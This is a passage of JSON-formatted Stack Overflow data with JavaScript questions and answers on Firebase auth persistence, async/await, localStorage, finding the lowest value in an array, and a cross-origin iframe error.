key-points mentioned above? I feel that i fully understand \"how\" the function works, but i would like to know \"why\" is the method working. How does one know that these methods together will allow the function to return what is desired?</p>\n\n<p>I feel like it has everything to do with the mathematical definition of combinations but i am not familiar with this specific topic so i am wondering if anyone can enlighten me if i have structured this question in a way that makes sense?</p>\n"}, {"tags": ["javascript", "firebase", "google-authentication"], "answers": [{"tags": [], "owner": {"reputation": 411025, "user_id": 209103, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/12d378e6a9788ab9c94bbafe242b82b4?s=128&d=identicon&r=PG", "display_name": "Frank van Puffelen", "link": "https://stackoverflow.com/users/209103/frank-van-puffelen"}, "is_accepted": true, "score": 0, "last_activity_date": 1558569819, "creation_date": 1558569819, "answer_id": 56266455, "question_id": 56266211, "link": "https://stackoverflow.com/questions/56266211/cant-have-persistent-google-authentication-firebase/56266455#56266455", "title": "Can&#39;t have persistent Google authentication (Firebase)", "body": "<p>Sign-in state is automatically persisted to local storage in your browser, and restored when the page/app reloads. To detect changes in authentication state, use an <code>onAuthStateChanged</code> listener as shown <a href=\"https://firebase.google.com/docs/auth/web/manage-users#get_the_currently_signed-in_user\" rel=\"nofollow noreferrer\">here</a>:</p>\n\n<blockquote>\n<pre><code>firebase.auth().onAuthStateChanged(function(user) {\n  if (user) {\n    // User is signed in.\n  } else {\n    // No user is signed in.\n  }\n});\n</code></pre>\n</blockquote>\n\n<p>This listener will fire both when the user actively signs in (i.e. when the call to <code>signInWithPopup</code> completes), <em>and</em> when the user sign-in state is restored after reloading the app/page.</p>\n"}], "owner": {"reputation": 399, "user_id": 5012558, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/53d4033d21348e98143ca297fa22daca?s=128&d=identicon&r=PG&f=1", "display_name": "ItsaMeTuni", "link": "https://stackoverflow.com/users/5012558/itsametuni"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 82, "favorite_count": 0, "accepted_answer_id": 56266455, "answer_count": 1, "score": 1, "last_activity_date": 1558569819, "creation_date": 1558567530, "question_id": 56266211, "link": "https://stackoverflow.com/questions/56266211/cant-have-persistent-google-authentication-firebase", "title": "Can&#39;t have persistent Google authentication (Firebase)", "body": "<p>I'm trying to have a persistent Google authentication with Firebase. I can log in successfully but the session does not persist if I reload the page.</p>\n\n<p>Here's my code:</p>\n\n<pre><code>firebase.auth().setPersistence(firebase.auth.Auth.Persistence.LOCAL)\n.then(function()\n{\n    let provider = new firebase.auth.GoogleAuthProvider();\n    firebase.auth().signInWithPopup(provider)\n    .then(function (result)\n    {\n        //Save auth data\n    });\n})\n.catch(function(error)\n{\n    console.error(error);\n});\n</code></pre>\n\n<p>This is basically what's written in the docs and should be pretty straightforward. I really don't know what I'm missing.</p>\n\n<p>Also, I don't know what's supposed to happen when the session is permanent, is it just going to authenticate silently or is it going to open the popup, authenticate and then close the popup automatically?</p>\n\n<p>Thanks!</p>\n"}, {"tags": ["javascript"], "comments": [{"owner": {"reputation": 31533, "user_id": 2813224, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/602e78d7da7bd6353c8ee51a17826037?s=128&d=identicon&r=PG", "display_name": "zer00ne", "link": "https://stackoverflow.com/users/2813224/zer00ne"}, "edited": false, "score": 1, "creation_date": 1558567853, "post_id": 56266197, "comment_id": 99148640, "body": "<code>await</code> can only work nested as a direct child of an <code>async</code> function."}], "answers": [{"comments": [{"owner": {"reputation": 451, "user_id": 1013518, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/69f9d8b840ea19486772c69892e24b13?s=128&d=identicon&r=PG", "display_name": "pingeyeg", "link": "https://stackoverflow.com/users/1013518/pingeyeg"}, "edited": false, "score": 1, "creation_date": 1558622241, "post_id": 56266357, "comment_id": 99169540, "body": "Thanks for the valuable feedback.  I&#39;m going to give this a try as it definitely looks promising."}, {"owner": {"reputation": 1283, "user_id": 7275319, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Rhr5z.jpg?s=128&g=1", "display_name": "Michael Sorensen", "link": "https://stackoverflow.com/users/7275319/michael-sorensen"}, "reply_to_user": {"reputation": 451, "user_id": 1013518, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/69f9d8b840ea19486772c69892e24b13?s=128&d=identicon&r=PG", "display_name": "pingeyeg", "link": "https://stackoverflow.com/users/1013518/pingeyeg"}, "edited": false, "score": 1, "creation_date": 1558631634, "post_id": 56266357, "comment_id": 99174139, "body": "Iseewhatyoudidthere"}], "tags": [], "owner": {"reputation": 1283, "user_id": 7275319, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Rhr5z.jpg?s=128&g=1", "display_name": "Michael Sorensen", "link": "https://stackoverflow.com/users/7275319/michael-sorensen"}, "is_accepted": true, "score": 1, "last_activity_date": 1558568860, "creation_date": 1558568860, "answer_id": 56266357, "question_id": 56266197, "link": "https://stackoverflow.com/questions/56266197/how-to-make-multiple-async-await-calls/56266357#56266357", "title": "How to make multiple async await calls", "body": "<p>It appears that you missed one of the fundamental features of async/await.</p>\n\n<blockquote>\n  <p>An async function can contain an await expression that pauses the execution of the async function and waits for the passed Promise's resolution, and then resumes the async function's execution and returns the resolved value.</p>\n</blockquote>\n\n<p>The key part being is that the execution inside the function call is paused. So your next if statement won't be considered until after the first promise has resolved.</p>\n\n<p>from <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/async_function\" rel=\"nofollow noreferrer\">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/async_function</a></p>\n\n<p>This is usually where I like to use the Promise.all function <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/all\" rel=\"nofollow noreferrer\">MDN Link</a></p>\n\n<p>This is how I would modify your code (I know it doesn't use async/await but, it should accomplish your goal)</p>\n\n<pre><code>function yourFunction(){\n\n    let myPromiseArray = [];\n\n    if (goldenListKeys[0].name === 'date') {\n\n        const date = moment('07-01-2019', 'YYYY-MM-DD').format('MM/DD/YYYY');\n\n        _.assign(tmpObj, { inputData: { [goldenListKeys[0].name]: date } });\n\n        myPromiseArray.push(his.plansApi\n            .compileFields({ tmpObj, carrier, benefitQuery }))\n    }\n\n    if (goldenListKeys[1].name === 'state') {\n\n        _.assign(tmpObj, {\n            inputData: { ...tmpObj, [goldenListKeys[1].name]: 'NC' },\n        });\n\n        myPromiseArray.push(this.plansApi\n            .compileFields({ tmpObj, carrier, benefitQuery }))\n\n    }\n\n    Promise.all(myPromiseArray).then((resultArray)=&gt;{\n        //do something with results\n    }).catch(errorArray =&gt; {\n        //handle Errors\n    })\n}\n</code></pre>\n"}], "owner": {"reputation": 451, "user_id": 1013518, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/69f9d8b840ea19486772c69892e24b13?s=128&d=identicon&r=PG", "display_name": "pingeyeg", "link": "https://stackoverflow.com/users/1013518/pingeyeg"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 177, "favorite_count": 0, "accepted_answer_id": 56266357, "answer_count": 1, "score": 1, "last_activity_date": 1558568860, "creation_date": 1558567335, "question_id": 56266197, "link": "https://stackoverflow.com/questions/56266197/how-to-make-multiple-async-await-calls", "title": "How to make multiple async await calls", "body": "<p>I'm trying to build an object based on the responses from multiple promises, but I'm noticed where only the first promise is actually being worked on while the second is being ignored.  What is the best practice to make this work?</p>\n\n<pre><code>if (goldenListKeys[0].name === 'date') {\n  const date = moment('07-01-2019', 'YYYY-MM-DD').format('MM/DD/YYYY');\n  _.assign(tmpObj, { inputData: { [goldenListKeys[0].name]: date } });\n  try {\n    await this.plansApi\n      .compileFields({ tmpObj, carrier, benefitQuery })\n      .catch(error =&gt; {\n        value = error.response['invalid-selection'];\n        console.log(`One: ${value}`);\n      });\n  } catch (err) {}\n}\nif (goldenListKeys[1].name === 'state') {\n  console.log('Here');\n  _.assign(tmpObj, {\n    inputData: { ...tmpObj, [goldenListKeys[1].name]: 'NC' },\n  });\n  try {\n    await this.plansApi\n      .compileFields({ tmpObj, carrier, benefitQuery })\n      .catch(error =&gt; {\n        value = error.response['invalid-selection'];\n        _.assign(goldenListKeys, { filler: value });\n        console.log(`Two: ${value}`);\n      });\n  } catch (err) {}\n}\n</code></pre>\n"}, {"tags": ["javascript", "html"], "answers": [{"comments": [{"owner": {"reputation": 129, "user_id": 11535823, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b83d895df7b46ccac4fe6337bfa28229?s=128&d=identicon&r=PG&f=1", "display_name": "tmanrocks994", "link": "https://stackoverflow.com/users/11535823/tmanrocks994"}, "edited": false, "score": 0, "creation_date": 1558572618, "post_id": 56266181, "comment_id": 99149441, "body": "thanks ive never used this before can u give me a example on where to put that in my code to make it functioning? for example my skill points carrying over to the skill tree tab ( it adds one to a counter when u rebirth) or the other way around hp up going to home tab"}], "tags": [], "owner": {"reputation": 36576, "user_id": 2341603, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/ZTHIr.jpg?s=128&g=1", "display_name": "Obsidian Age", "link": "https://stackoverflow.com/users/2341603/obsidian-age"}, "is_accepted": true, "score": 2, "last_activity_date": 1558567243, "creation_date": 1558567243, "answer_id": 56266181, "question_id": 56266164, "link": "https://stackoverflow.com/questions/56266164/how-to-fix-progress-resetting-when-i-switch-my-tabs/56266181#56266181", "title": "How to fix progress resetting when i switch my tabs", "body": "<p>You can make use of <strong><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage\" rel=\"nofollow noreferrer\"><code>localStorage</code></a></strong>.</p>\n\n<p>On page one you can add an item into <code>localStorage</code> with:</p>\n\n<pre><code>localStorage.setItem('pet', 'Cat'); // name, value\n</code></pre>\n\n<p>And on page two you can retrieve the value with:</p>\n\n<pre><code>var pet = localStorage.getItem('pet');\n</code></pre>\n\n<p>You can also overwrite the value later on, or remove it with:</p>\n\n<pre><code>localStorage.removeItem('pet'); // remove an individual item\nlocalStorage.clear(); // remove all items\n</code></pre>\n\n<p>Note that <code>localStorage</code> <strong>persists</strong> across browser sessions. If you want to restrict the storage to an individual session, you should instead make use of <strong><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Window/sessionStorage\" rel=\"nofollow noreferrer\"><code>sessionStorage</code></a></strong>.</p>\n"}], "owner": {"reputation": 129, "user_id": 11535823, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b83d895df7b46ccac4fe6337bfa28229?s=128&d=identicon&r=PG&f=1", "display_name": "tmanrocks994", "link": "https://stackoverflow.com/users/11535823/tmanrocks994"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 27, "favorite_count": 0, "accepted_answer_id": 56266181, "answer_count": 1, "score": 0, "last_activity_date": 1558567243, "creation_date": 1558567124, "question_id": 56266164, "link": "https://stackoverflow.com/questions/56266164/how-to-fix-progress-resetting-when-i-switch-my-tabs", "title": "How to fix progress resetting when i switch my tabs", "body": "<p>Im making a game with tabs and as it stands progress between tabs resets when I change tabs  <a href=\"http://prntscr.com/ns2jvg\" rel=\"nofollow noreferrer\">http://prntscr.com/ns2jvg</a>   <a href=\"http://prntscr.com/ns2k31\" rel=\"nofollow noreferrer\">http://prntscr.com/ns2k31</a>  <a href=\"http://prntscr.com/ns2k74\" rel=\"nofollow noreferrer\">http://prntscr.com/ns2k74</a>     I know eventually i'll make a last tab called options that you can use to reset. but i would like for development to be able to debug and be able to switch tabs with no reset</p>\n\n<p>Im not sure how this is done im new to html</p>\n\n<p>This is my Home Tab in html:</p>\n\n<pre><code>&lt;html&gt;\n\n&lt;head&gt;\n    &lt;title&gt; Basic Clicker&lt;/title&gt;\n    &lt;link rel=\"stylesheet\" href=\"css/style.css\" /&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n    &lt;div class=\"nav_bar\"&gt;\n        &lt;ul&gt;\n            &lt;li&gt;&lt;a href=\"GameMainWindow.html\" id=\"onlink\"&gt;Home&lt;/a&gt;&lt;/li&gt;\n            &lt;li&gt;&lt;a href=\"SkillTree.html\"&gt;SkillTree&lt;/a&gt;&lt;/li&gt;\n            &lt;li&gt;&lt;a href=\"Equipment.html\"&gt;Equipment&lt;/a&gt;&lt;/li&gt;\n            &lt;li&gt;&lt;a href=\"Pets.html\"&gt;Pets&lt;/a&gt;&lt;/li&gt;\n            &lt;li&gt;&lt;a href=\"Skills.html\"&gt;Skills&lt;/a&gt;&lt;/li&gt;\n            &lt;li&gt;&lt;a href=\"Quests.html\"&gt;Quests&lt;/a&gt;&lt;/li&gt;\n        &lt;/ul&gt;\n    &lt;/div&gt;\n    &lt;div class=\"main_container\"&gt;\n        &lt;p&gt;\n            &lt;html&gt;\n\n            &lt;head&gt;\n                &lt;link rel=\"stylesheet\" type=\"text/css\" \nhref=\"interface.css\" /&gt;\n            &lt;/head&gt;\n            &lt;title&gt; Basic Clicker&lt;/title&gt;\n\n            &lt;body&gt;\n</code></pre>\n\n<p>This is the next tab in html:</p>\n\n<pre><code>&lt;html&gt;\n\n&lt;head&gt;\n        &lt;title&gt; Basic Clicker&lt;/title&gt;\n    &lt;link rel=\"stylesheet\" href=\"css/style.css\" /&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n    &lt;div class=\"nav_bar\"&gt;\n        &lt;ul&gt;\n            &lt;li&gt;&lt;a href=\"GameMainWindow.html\"&gt;Home&lt;/a&gt;&lt;/li&gt;\n            &lt;li&gt;&lt;a href=\"SkillTree.html\" id=\"onlink\"&gt;SkillTree&lt;/a&gt;&lt;/li&gt;\n            &lt;li&gt;&lt;a href=\"Equipment.html\"&gt;Equipment&lt;/a&gt;&lt;/li&gt;\n            &lt;li&gt;&lt;a href=\"Pets.html\"&gt;Pets&lt;/a&gt;&lt;/li&gt;\n            &lt;li&gt;&lt;a href=\"Skills.html\"&gt;Skills&lt;/a&gt;&lt;/li&gt;\n            &lt;li&gt;&lt;a href=\"Quests.html\"&gt;Quests&lt;/a&gt;&lt;/li&gt;\n        &lt;/ul&gt;\n    &lt;/div&gt;\n    &lt;div class=\"main_container\"&gt;\n        &lt;p&gt;\n            &lt;html&gt;\n\n            &lt;head&gt;\n                &lt;link rel=\"stylesheet\" type=\"text/css\" \nhref=\"interface.css\" /&gt;\n            &lt;/head&gt;\n            &lt;title&gt; Basic Clicker&lt;/title&gt;\n\n            &lt;body&gt;\n</code></pre>\n\n<p>I expect the tabs to switch and for the player to not lose any data/ it not to reset. right now things reset when you click a different tab.</p>\n"}, {"tags": ["javascript", "arrays"], "answers": [{"tags": [], "owner": {"reputation": 73287, "user_id": 3874623, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/6df0aa136ee42f4ea24ef08b7c348e7a?s=128&d=identicon&r=PG&f=1", "display_name": "Mark", "link": "https://stackoverflow.com/users/3874623/mark"}, "is_accepted": false, "score": 4, "last_activity_date": 1558567307, "creation_date": 1558567307, "answer_id": 56266193, "question_id": 56266152, "link": "https://stackoverflow.com/questions/56266152/how-to-get-lowest-integer-from-objects-in-an-array/56266193#56266193", "title": "How to get lowest integer from objects in an array?", "body": "<p><code>Math.min</code> is a little to simple for this \u2014 there's no way to specify what you mean by min in an object with several values. </p>\n\n<p>You can use <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/Reduce\" rel=\"nofollow noreferrer\"><code>reduce()</code></a> to loop over the items in the list and keep track of the current lowest. The result will be the lowest in the list based on the function passed to reduce:</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>let l = [{foo:\"bar\",abc:\"xyz\",number:1},{foo:\"car\",abc:\"hcu\",number:2},{foo:\"tar\",abc:\"uif\",number:3}]\r\n\r\nlet lowest = l.reduce((lowest, item) =&gt; item.number &lt; lowest.number ? item: lowest)\r\nconsole.log(lowest)</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}, {"comments": [{"owner": {"reputation": 73287, "user_id": 3874623, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/6df0aa136ee42f4ea24ef08b7c348e7a?s=128&d=identicon&r=PG&f=1", "display_name": "Mark", "link": "https://stackoverflow.com/users/3874623/mark"}, "edited": false, "score": 0, "creation_date": 1558568088, "post_id": 56266260, "comment_id": 99148680, "body": "Does this require the array to already be sorted? Unless I&#39;m misunderstanding something this seems to fail when array is not already sorted by <code>number</code>."}, {"owner": {"reputation": 56607, "user_id": 695364, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUNjJ.jpg?s=128&g=1", "display_name": "Scott Marcus", "link": "https://stackoverflow.com/users/695364/scott-marcus"}, "reply_to_user": {"reputation": 73287, "user_id": 3874623, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/6df0aa136ee42f4ea24ef08b7c348e7a?s=128&d=identicon&r=PG&f=1", "display_name": "Mark", "link": "https://stackoverflow.com/users/3874623/mark"}, "edited": false, "score": 0, "creation_date": 1558568309, "post_id": 56266260, "comment_id": 99148702, "body": "@MarkMeyer Yes, it does. This is why I say it can work, but it&#39;s not the best approach."}, {"owner": {"reputation": 73287, "user_id": 3874623, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/6df0aa136ee42f4ea24ef08b7c348e7a?s=128&d=identicon&r=PG&f=1", "display_name": "Mark", "link": "https://stackoverflow.com/users/3874623/mark"}, "edited": false, "score": 0, "creation_date": 1558568344, "post_id": 56266260, "comment_id": 99148713, "body": "Actually it seems to require that <code>number</code> corresponds to the index in the array. For example, given <code>[{foo:&quot;bar&quot;,abc:&quot;xyz&quot;,number:2},{foo:&quot;car&quot;,abc:&quot;hcu&quot;,number:&zwnj;&#8203;5}]</code> it returns the item number 5."}], "tags": [], "owner": {"reputation": 56607, "user_id": 695364, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUNjJ.jpg?s=128&g=1", "display_name": "Scott Marcus", "link": "https://stackoverflow.com/users/695364/scott-marcus"}, "is_accepted": false, "score": 0, "last_activity_date": 1558567906, "creation_date": 1558567906, "answer_id": 56266260, "question_id": 56266152, "link": "https://stackoverflow.com/questions/56266152/how-to-get-lowest-integer-from-objects-in-an-array/56266260#56266260", "title": "How to get lowest integer from objects in an array?", "body": "<p><code>Math.min()</code> can work, but it would require that you use destructuring and some massaging of the array index to account for 0-base.</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>var r = {};\r\nr.collection = [{foo:\"bar\",abc:\"xyz\",number:1},{foo:\"car\",abc:\"hcu\",number:2},{foo:\"tar\",abc:\"uif\",number:3}];\r\nvar min = r.collection[Math.min(...(r.collection.map(function(item){return item.number})))-1];\r\n\r\nconsole.log(min);</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}, {"tags": [], "owner": {"reputation": 15562, "user_id": 155819, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/yXygz.jpg?s=128&g=1", "display_name": "Akrion", "link": "https://stackoverflow.com/users/155819/akrion"}, "is_accepted": false, "score": 0, "last_activity_date": 1558584840, "creation_date": 1558584840, "answer_id": 56267988, "question_id": 56266152, "link": "https://stackoverflow.com/questions/56266152/how-to-get-lowest-integer-from-objects-in-an-array/56267988#56267988", "title": "How to get lowest integer from objects in an array?", "body": "<p>You could also simply sort the array via <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/sort\" rel=\"nofollow noreferrer\">Array.sort</a> and pick the first item from it:</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>let data = [{foo:\"car\",abc:\"hcu\",number:2},{foo:\"bar\",abc:\"xyz\",number:1},{foo:\"tar\",abc:\"uif\",number:3}]\r\n\r\nlet result = data.sort((a,b) =&gt; a.number - b.number)[0]\r\n\r\nconsole.log(result)</code></pre>\r\n</div>\r\n</div>\r\n</p>\n\n<p>If you need the <code>max</code> simply reverse the sort by <code>b.number - a.number</code> etc.</p>\n"}], "owner": {"reputation": 31, "user_id": 8673841, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2f85f4c326aa4eef199ee9ce370af0de?s=128&d=identicon&r=PG&f=1", "display_name": "netsocket", "link": "https://stackoverflow.com/users/8673841/netsocket"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 65, "favorite_count": 1, "answer_count": 3, "score": 0, "last_activity_date": 1558584840, "creation_date": 1558566985, "question_id": 56266152, "link": "https://stackoverflow.com/questions/56266152/how-to-get-lowest-integer-from-objects-in-an-array", "title": "How to get lowest integer from objects in an array?", "body": "<p>Basically what I'm trying to achieve, is the lowest integer from an object thats in an array with other objects. </p>\n\n<pre><code>r.Collection\n</code></pre>\n\n<p>is an array that holds 3 objects, so it looks something like this:</p>\n\n<pre><code>[{foo:\"bar\",abc:\"xyz\",number:1},{foo:\"car\",abc:\"hcu\",number:2},{foo:\"tar\",abc:\"uif\",number:3}]\n</code></pre>\n\n<p>Now the goal, is to sort through this array.  and look at each of the number values, once it finds the lowest value. I need it to pull that entire object out of the array to use later.</p>\n\n<p>Currently what i'm trying to do isn't working and i'm not sure. I could be doing this totally wrong</p>\n\n<pre><code> for (o in r.Collection) {\n                    var data = r.Collection[o]\n                    console.log(Math.min(data.number))\n                }\n</code></pre>\n\n<p>I know to use Math.min to find the smallest number in an array, but when I run this code, every object gets printed.</p>\n\n<p>How do I sort through this array, to pull our the object with the lowest number value?</p>\n"}, {"tags": ["javascript", "html", "apache", ".htaccess"], "comments": [{"owner": {"reputation": 4916, "user_id": 1507691, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/NRfxQ.jpg?s=128&g=1", "display_name": "Zak", "link": "https://stackoverflow.com/users/1507691/zak"}, "edited": false, "score": 1, "creation_date": 1558567036, "post_id": 56266115, "comment_id": 99148485, "body": "You cannot access<code>iFrame</code> data (html) cross origin ..  This is expected and <b>intentional</b>  --  Otherwise what&#39;s to stop you from posting an <code>iFrame</code> of a bank login and collecting the user info?"}, {"owner": {"reputation": 9, "user_id": 11541973, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/phEDh.jpg?s=128&g=1", "display_name": "Kimo41", "link": "https://stackoverflow.com/users/11541973/kimo41"}, "reply_to_user": {"reputation": 4916, "user_id": 1507691, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/NRfxQ.jpg?s=128&g=1", "display_name": "Zak", "link": "https://stackoverflow.com/users/1507691/zak"}, "edited": false, "score": 0, "creation_date": 1558567283, "post_id": 56266115, "comment_id": 99148536, "body": "Zak, How i will allow my clients access to my subdomain using &lt;iframe&gt;?"}, {"owner": {"reputation": 9, "user_id": 11541973, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/phEDh.jpg?s=128&g=1", "display_name": "Kimo41", "link": "https://stackoverflow.com/users/11541973/kimo41"}, "reply_to_user": {"reputation": 4916, "user_id": 1507691, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/NRfxQ.jpg?s=128&g=1", "display_name": "Zak", "link": "https://stackoverflow.com/users/1507691/zak"}, "edited": false, "score": 0, "creation_date": 1558567518, "post_id": 56266115, "comment_id": 99148583, "body": "Zak, I need share my contents openly!, without restrictions, is this a problem of browsers and not about the authorization of my .htaccess, maybe?"}, {"owner": {"reputation": 9, "user_id": 11541973, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/phEDh.jpg?s=128&g=1", "display_name": "Kimo41", "link": "https://stackoverflow.com/users/11541973/kimo41"}, "reply_to_user": {"reputation": 4916, "user_id": 1507691, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/NRfxQ.jpg?s=128&g=1", "display_name": "Zak", "link": "https://stackoverflow.com/users/1507691/zak"}, "edited": false, "score": 0, "creation_date": 1558567964, "post_id": 56266115, "comment_id": 99148662, "body": "Zak, Why create the &lt;iframe&gt; tag, If it cannot be used for the initial essence(share the content of other site)?"}, {"owner": {"reputation": 9, "user_id": 11541973, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/phEDh.jpg?s=128&g=1", "display_name": "Kimo41", "link": "https://stackoverflow.com/users/11541973/kimo41"}, "reply_to_user": {"reputation": 4916, "user_id": 1507691, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/NRfxQ.jpg?s=128&g=1", "display_name": "Zak", "link": "https://stackoverflow.com/users/1507691/zak"}, "edited": false, "score": 0, "creation_date": 1558568648, "post_id": 56266115, "comment_id": 99148756, "body": "Zak reply of your question..., What&#39;s to stop you from posting an iFrame of a bank login and collecting the user info?, the answer is simply, blocking using of iframe using .htaccess to all domains except the domain of bank, but the situation here is: 1. My site is not a bank!, 2. Im the owner of my site."}, {"owner": {"reputation": 9, "user_id": 11541973, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/phEDh.jpg?s=128&g=1", "display_name": "Kimo41", "link": "https://stackoverflow.com/users/11541973/kimo41"}, "reply_to_user": {"reputation": 4916, "user_id": 1507691, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/NRfxQ.jpg?s=128&g=1", "display_name": "Zak", "link": "https://stackoverflow.com/users/1507691/zak"}, "edited": false, "score": 0, "creation_date": 1558568916, "post_id": 56266115, "comment_id": 99148805, "body": "Zak, And what about the sites who want allow cors access feature on his site?, they cannot use cors of his domains when they are the owners?, i really can&#39;t understand and i think your comment is out of topic."}], "answers": [{"comments": [{"owner": {"reputation": 9, "user_id": 11541973, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/phEDh.jpg?s=128&g=1", "display_name": "Kimo41", "link": "https://stackoverflow.com/users/11541973/kimo41"}, "edited": false, "score": 0, "creation_date": 1558574291, "post_id": 56266488, "comment_id": 99149737, "body": "Thank you, i&#39;m in a enterprise plan of cloudflare, it works, finally someone give me a good solution..."}], "tags": [], "owner": {"reputation": 14, "user_id": 11542165, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CWl85.jpg?s=128&g=1", "display_name": "Marcus R.", "link": "https://stackoverflow.com/users/11542165/marcus-r"}, "is_accepted": true, "score": -2, "last_activity_date": 1558570117, "creation_date": 1558570117, "answer_id": 56266488, "question_id": 56266115, "link": "https://stackoverflow.com/questions/56266115/cors-domain-problem-with-iframe-and-htaccess-why/56266488#56266488", "title": "Cors domain problem with &lt;iframe&gt; and .htaccess, why?", "body": "<p>Kimo41, i already read your comments, and i'm accord with you, the cors policy have to be decision of the owner of the website and domain, not of the web browsers, I think i have a good solution for you, you can try JS WORKERS, for allow cors in your domains if you are using Cloudflare as DNS.</p>\n\n<p>Response headers:</p>\n\n<pre><code>addEventListener('fetch', event =&gt; {\n  event.respondWith(handleRequest(event.request))\n})\n\nasync function handleRequest(request) {\n  let response = await fetch(request)\n\n  // Make the headers mutable by re-constructing the Response.\n  response = new Response(response.body, response)\n  response.headers.set('x-my-header', 'custom value')\n\n  return response\n}\n</code></pre>\n\n<p>Request Headers:</p>\n\n<pre><code>addEventListener('fetch', event =&gt; {\n  event.respondWith(handleRequest(event.request))\n})\n\nasync function handleRequest(request) {\n  // Make the headers mutable by re-constructing the Request.\n  request = new Request(request)\n  request.headers.set('x-my-header', 'custom value')\n\n  return await fetch(request)\n}\n</code></pre>\n"}], "owner": {"reputation": 9, "user_id": 11541973, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/phEDh.jpg?s=128&g=1", "display_name": "Kimo41", "link": "https://stackoverflow.com/users/11541973/kimo41"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1460, "favorite_count": 0, "closed_date": 1558573435, "accepted_answer_id": 56266488, "answer_count": 1, "score": -1, "last_activity_date": 1576465754, "creation_date": 1558566779, "last_edit_date": 1576465754, "question_id": 56266115, "link": "https://stackoverflow.com/questions/56266115/cors-domain-problem-with-iframe-and-htaccess-why", "closed_reason": "Duplicate", "title": "Cors domain problem with &lt;iframe&gt; and .htaccess, why?", "body": "<p>My problem is my iframe blocks my Javascript access, when I try to access to the content inside the <code>&lt;iframe&gt;</code> of my subdomain(test.example.com:xx), xx is the line number of my code, look below the error.</p>\n\n<p>Error:</p>\n\n<blockquote>\n  <p>Uncaught DOMException: Blocked a frame with origin\n  \"<a href=\"https://example.com\" rel=\"nofollow noreferrer\">https://example.com</a>\" from accessing a cross-origin frame. at\n  window.onload (<a href=\"https://example.com\" rel=\"nofollow noreferrer\">https://example.com</a>)</p>\n</blockquote>\n\n<p>Here the code of <a href=\"https://example.com/index.html\" rel=\"nofollow noreferrer\">https://example.com/index.html</a>:</p>\n\n<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;body&gt;\n    &lt;iframe id=\"frames\" src=\"https://test.example.com\"&gt;\n    &lt;/iframe&gt;\n&lt;script&gt;\n\nvar x = document.getElementById(\"frames\");\nconsole.log(x);\nwindow.onload = function() {\n    console.log(window.frames[0].document.body.innerHTML);\n}\n&lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>Here the code of my <a href=\"https://test.example.com/index.html\" rel=\"nofollow 